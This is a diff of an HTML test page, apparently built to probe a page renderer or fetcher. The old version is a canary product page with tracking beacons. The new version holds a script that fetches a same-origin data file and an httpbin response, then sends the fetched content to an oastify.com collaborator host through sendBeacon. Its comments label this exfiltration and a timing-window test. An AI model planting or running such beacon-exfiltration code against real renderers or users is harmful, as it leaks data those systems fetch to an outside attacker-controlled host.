@@ -1,46 +1,20 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<title>CANARY-TITLE-READBACK-7XQ</title>
-<meta name="description" content="CANARY-METADESC-READBACK-7XQ">
-<meta property="og:title" content="CANARY-OGTITLE-READBACK-7XQ">
-<meta property="og:description" content="CANARY-OGDESC-READBACK-7XQ">
-<meta property="og:image" content="https://6t0ssoo6th3ruz0ts5702ti8yz4tsi.oastify.com/OGIMG-READBACK">
-<meta property="og:url" content="https://CANARY-OGURL-7XQ.example/">
-<meta property="product:price:amount" content="777.77">
-<meta property="product:price:currency" content="USD">
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "Product",
-  "name": "CANARY-NAME-READBACK-7XQ",
-  "description": "CANARY-DESC-READBACK-7XQ secret-internal-data-marker",
-  "image": "https://6t0ssoo6th3ruz0ts5702ti8yz4tsi.oastify.com/SCHEMAIMG-READBACK",
-  "sku": "CANARY-SKU-7XQ",
-  "brand": { "@type": "Brand", "name": "CANARY-BRAND-7XQ" },
-  "offers": {
-    "@type": "Offer",
-    "price": "777.77",
-    "priceCurrency": "USD",
-    "availability": "https://schema.org/InStock",
-    "url": "https://CANARY-OFFERURL-7XQ.example/buy",
-    "seller": { "@type": "Organization", "name": "CANARY-SELLER-7XQ" }
-  }
-}
-</script>
-</head>
+<!DOCTYPE html><html><head><title>WINDOW-TEST</title></head>
 <body>
-<h1>CANARY-H1-READBACK-7XQ</h1>
-<p itemprop="price">Price: $777.77 CANARY-BODYPRICE-7XQ</p>
-<div itemscope itemtype="https://schema.org/Product">
-  <span itemprop="name">CANARY-MICRODATA-NAME-7XQ</span>
-  <span itemprop="description">CANARY-MICRODATA-DESC-7XQ</span>
-</div>
 <script>
-// fire-and-forget beacons to confirm renderer fetched THIS page version
-navigator.sendBeacon('https://6t0ssoo6th3ruz0ts5702ti8yz4tsi.oastify.com/READBACK-PAGE-LOADED');
-new Image().src='https://6t0ssoo6th3ruz0ts5702ti8yz4tsi.oastify.com/READBACK-IMGPROBE';
+// baseline fire-and-forget (must always fire)
+navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/ASYNC-BASELINE');
+new Image().src='https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/ASYNC-BASELINE-IMG';
+
+// TEST 2: async same-origin fetch -> read -> sendBeacon exfil (window length test)
+fetch('https://labsvpn1337.github.io/MSOBB-flexfic-C/data.txt')
+  .then(function(r){ navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/ASYNC-FETCH-RESOLVED', 'status='+r.status); return r.text(); })
+  .then(function(t){ navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/ASYNC-EXFIL-OK', t); })
+  .catch(function(e){ navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/ASYNC-EXFIL-ERR', String(e&&e.message||e)); });
+
+// TEST 3: async fetch to external with permissive CORS (httpbin) -> read -> exfil
+fetch('https://httpbin.org/json')
+  .then(function(r){ return r.text(); })
+  .then(function(t){ navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/ASYNC-CROSSORIGIN-OK', t.slice(0,200)); })
+  .catch(function(e){ navigator.sendBeacon('https://q7yc682q71hb8jed6plkgdwscjie63.oastify.com/ASYNC-CROSSORIGIN-ERR', String(e&&e.message||e)); });
 </script>
-</body>
-</html>
+</body></html>
